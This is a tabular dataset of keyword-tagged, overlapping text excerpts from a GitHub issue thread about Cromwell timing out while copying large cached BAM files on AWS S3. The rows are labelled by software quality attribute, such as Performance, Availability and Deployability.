BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2634,Safety,timeout,timeout,2634,"c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:3065,Safety,Timeout,TimeoutException,3065,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2917,Testability,log,log,2917,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1240,Availability,Error,Error,1240,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1251,Availability,Failure,Failure,1251,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:445,Deployability,update,updated,445,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:670,Deployability,release,release,670,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:743,Deployability,configurat,configuration,743,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:826,Deployability,Install,Installing,826,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:743,Modifiability,config,configuration,743,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1124,Modifiability,config,config,1124,"efore the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:141,Performance,cache,cached,141,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:263,Performance,cache,cached,263,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:470,Performance,perform,perform,470,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491
